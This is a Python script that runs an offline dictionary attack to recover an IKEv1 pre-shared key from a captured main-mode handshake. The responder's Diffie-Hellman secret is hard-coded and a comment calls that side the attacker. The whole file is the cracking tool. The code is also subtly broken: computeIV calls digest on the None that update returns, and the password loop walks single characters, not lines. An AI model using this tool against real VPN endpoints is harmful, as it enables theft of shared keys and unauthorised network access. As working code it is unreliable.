import binascii
import hmac
from hashlib import sha1
import hashlib
import ikev1_pcapReader as pcapReader
import ikev1_payloadParser as ikeParser
from Crypto.Cipher import AES

pcapPath = "pcaps/ikev1-psk-main-mode-incomplete.pcapng"
# dictPath = "dict/list-simple.txt"
dictPath = "dict/list.txt"

# required diffie hellman secret of the responder (attacker)
dhSecret = binascii.unhexlify(
    "34B52971CD61F18048EE97D20DA488A4634125F300DC2D1F470BDBB68B989FB999A2721328084C165CBEBDCA0C08B516799132B8F647AE46BD2601028EC7E3954AAF612828826A031FF08B7AE4057CAE0ADB51453BAAE84691705E913BA95067B816385C37D2BD85701501F94A1AA27FFC20A9546EC9DEFF8A1CB33588819A55")

# idHex  = ...||PayloadLength||IDType||ProtocolID||Port||IPAddress
idHex = "0800000c01000000c0a80064"
idPlainValue = binascii.unhexlify(idHex)
idLength = idHex.__len__()


def bytesToHex(arg):
    return str(binascii.hexlify(bytes(arg)), 'ascii')


def computeKey(psk: str, p_initNonce, p_respNonce):
    h = hmac.new(psk.encode("ascii"), p_initNonce + p_respNonce, sha1)
    return h


def deriveKeys(k, dh, initCookie, respCookie) -> list:
    k0 = hmac.new(k.digest(), dh + initCookie + respCookie + bytes([0]), sha1).digest()
    k1 = hmac.new(k.digest(), k0 + dh + initCookie + respCookie + bytes([1]), sha1).digest()
    k2 = hmac.new(k.digest(), k1 + dh + initCookie + respCookie + bytes([2]), sha1).digest()
    return [k0, k1, k2]


def decryptedHash(k2, iv_p, c_p):
    cipher = AES.new(k2, AES.MODE_CBC, iv_p)
    return cipher.decrypt(c_p)


def check(psk, p_dhSecret, p_initCookie, p_respCookie, p_initNonce, p_respNonce, p_iv, p_c):
    k = computeKey(psk, p_initNonce, p_respNonce)
    keys = deriveKeys(k, p_dhSecret, p_initCookie, p_respCookie)
    k2 = keys[2]
    p = decryptedHash(k2[:16], p_iv, p_c)
    return str(binascii.hexlify(p)[:idLength].lower(), "ascii") == str(binascii.hexlify(idPlainValue.lower()), "ascii")


def computeIV(initKeX, respKeX):
    func = hashlib.sha1()
    func.update(initKeX)
    return func.update(respKeX).digest()


if __name__ == '__main__':
    packets = pcapReader.openPCAPFile(pcapPath)
    isakmp_packets = pcapReader.getISAKMPPackets(packets)

    initPacket = ikeParser.getIniatorSAPacket(isakmp_packets)
    respPacket = ikeParser.getResponderSAPacket(isakmp_packets)

    initIP = ikeParser.getInitiatorIP(packets)
    respIP = ikeParser.getResponderIP(packets)

    initCookie = ikeParser.getCookieFromISAKMP(initPacket, False)
    respCookie = ikeParser.getCookieFromISAKMP(respPacket, True)

    #initNonce = ikeParser.getPayloadFromISAKMP(initPacket, ikeParser.NONCE)
    #respNonce = ikeParser.getPayloadFromISAKMP(respPacket, ikeParser.NONCE)

    initNonce = ikeParser.getNonce(initPacket)
    respNonce = ikeParser.getNonce(respPacket)


    initK = ikeParser.getPayloadFromISAKMP(initPacket, ikeParser.KEX)
    respK = ikeParser.getPayloadFromISAKMP(respPacket, ikeParser.KEX)

    c = ikeParser.getEncryptedData(packets, initIP)[1]
    iv = computeIV(initK, respK)[:16]

    di = []
    with open(dictPath) as f:
        di = f.read()
        for password in di:
            password = password.strip()
            if check(password, dhSecret, initCookie, respCookie, initNonce, respNonce, iv, c):
                print("password found:" + password)
                break
